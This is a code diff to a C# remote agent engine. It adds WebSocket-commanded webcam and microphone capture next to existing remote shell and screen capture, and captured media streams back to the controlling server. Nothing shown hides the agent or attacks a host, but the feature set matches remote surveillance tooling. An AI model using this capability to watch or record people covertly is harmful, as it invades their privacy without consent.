@@ -21,6 +21,8 @@ public class AgentEngine
     private CancellationTokenSource? _cts;
     private InteractiveShellHandle? _shell;
     private ScreenCapture? _screenCapture;
+    private CameraCapture? _cameraCapture;
+    private MicCapture? _micCapture;
 
     public AgentEngine(ConfigManager config, AgentCrypto crypto)
     {
@@ -132,9 +134,11 @@ public class AgentEngine
             }
         }
 
-        // WS disconnected — clean up shell and screen
+        // WS disconnected — clean up shell, screen, camera, mic
         KillShell();
         HandleScreenUnbind();
+        HandleCameraUnbind();
+        HandleMicUnbind();
     }
 
     private async Task HandleWsMessage(WebSocketMessage msg, CancellationToken ct)
@@ -161,6 +165,26 @@ public class AgentEngine
 
             case "screen.config":
                 HandleScreenConfig(msg);
+                break;
+
+            case "camera.bind":
+                HandleCameraBind(msg);
+                break;
+
+            case "camera.unbind":
+                HandleCameraUnbind();
+                break;
+
+            case "camera.config":
+                HandleCameraConfig(msg);
+                break;
+
+            case "mic.bind":
+                HandleMicBind(msg);
+                break;
+
+            case "mic.unbind":
+                HandleMicUnbind();
                 break;
 
             case "shell.input":
@@ -663,5 +687,67 @@ public class AgentEngine
                 _screenCapture.SetQuality(qEl.GetString() ?? "720p");
         }
         catch { }
+    }
+
+    // ── Camera Capture ────────────────────────────────────────────────────
+
+    private void HandleCameraBind(WebSocketMessage msg)
+    {
+        HandleCameraUnbind();
+        int fps = 10;
+        int cameraIndex = 0;
+        try
+        {
+            if (msg.Data?.TryGetProperty("fps", out var fpsEl) == true)
+                fps = fpsEl.GetInt32();
+            if (msg.Data?.TryGetProperty("cameraIndex", out var idxEl) == true)
+                cameraIndex = idxEl.GetInt32();
+        }
+        catch { }
+
+        _cameraCapture = new CameraCapture(_ws!, _agentId);
+        _cameraCapture.Start(fps, cameraIndex);
+    }
+
+    private void HandleCameraUnbind()
+    {
+        _cameraCapture?.Stop();
+        _cameraCapture?.Dispose();
+        _cameraCapture = null;
+    }
+
+    private void HandleCameraConfig(WebSocketMessage msg)
+    {
+        if (_cameraCapture == null) return;
+        try
+        {
+            if (msg.Data?.TryGetProperty("fps", out var fpsEl) == true)
+                _cameraCapture.SetFps(fpsEl.GetInt32());
+        }
+        catch { }
+    }
+
+    // ── Microphone Capture ────────────────────────────────────────────────
+
+    private void HandleMicBind(WebSocketMessage msg)
+    {
+        HandleMicUnbind();
+        int deviceIndex = 0;
+        try
+        {
+            if (msg.Data?.TryGetProperty("deviceIndex", out var idxEl) == true)
+                deviceIndex = idxEl.GetInt32();
+        }
+        catch { }
+
+        _micCapture = new MicCapture(_ws!, _agentId);
+        _micCapture.Start(deviceIndex);
+    }
+
+    private void HandleMicUnbind()
+    {
+        _micCapture?.Stop();
+        _micCapture?.Dispose();
+        _micCapture = null;
     }
 }
